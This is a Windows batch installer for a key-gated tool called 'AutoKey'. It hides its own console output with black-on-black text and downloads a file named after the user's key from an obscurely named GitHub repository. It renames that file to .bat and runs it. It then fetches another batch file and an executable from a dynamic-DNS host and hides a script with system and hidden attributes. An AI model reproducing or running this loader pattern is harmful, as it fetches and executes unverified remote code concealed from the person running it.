@echo off
cd %temp%
set hide=[40;30m
set normal=[40;37m
:l
cls
title Autokey
echo %normal% 
echo 1. Update + install
echo 2. Uninstall
set /p select=Num: 
if %select%==1 goto key
if %select%==2 goto uninstall
goto l
:uninstall
echo %hide% 
cd %appdata%
rmdir /s /q AutoKey
if exist %USERPROFILE%\desktop\AutoKey_start.exe del %USERPROFILE%\desktop\AutoKey_start.exe
cls
goto end
exit
:key
title AutoKey SETUP
cls
echo %normal% 
echo Get USER_KEY https://discord.gg/cMTwPzCgXV
echo -
set /p key=USER_KEY_
set keyurl=https://raw.githubusercontent.com/W5GZ-X9YY-4GZY-3DYE/TF3N-KWTN-GWHL-6DA4/main/users/%key%
set file=%random%%random%%random%
cls 
echo checking...
echo %hide%
curl "%keyurl%" --output "%file%.exe" 
if exist "%file%.exe" (
cls
echo Installing...
goto key1
) else (
echo %normal%
goto key
)
:key1
rename %file%.exe %file%.bat
call %file%.bat
del %file%.bat
if %username%==%pcname% goto key2
cls
color 4
echo Detected!
echo Not your key!
timeout 20 > nul
color 0f
goto key
:key2
cls
echo %hide%
cd %appdata%
if exist AutoKey goto un
goto con
:un
cd autokey
attrib -h -s "AutoKey.{8-0-6-7-7-5}.bat"
del "AutoKey.{8-0-6-7-7-5}.bat"
cd ..
:con
rmdir /s /q AutoKey
md AutoKey
cd autokey
if exist %USERPROFILE%\desktop\AutoKey_start.exe del %USERPROFILE%\desktop\AutoKey_start.exe
set AK=host1.bat
cls


curl "https://raw.githubusercontent.com/W5GZ-X9YY-4GZY-3DYE/TF3N-KWTN-GWHL-6DA4/main/AK.bat" --output "host1.bat"
cd "%USERPROFILE%\desktop"
curl "http://autokeys.ddns.net/AutoKey/AutoKey.START.exe" --output "AutoKey_START.exe"
cd %appdata%/autokey"
(
echo set loadtab=5
echo set chrome=false
echo set USER_KEY=%key%
) > settings.ini
ren %AK% "AutoKey.{8-0-6-7-7-5}.bat"
attrib +h +s "AutoKey.{8-0-6-7-7-5}.bat"
:end
attrib -h -s "Setup.{8-0-6-7-7-5}.bat"
del "Setup.{8-0-6-7-7-5}.bat"



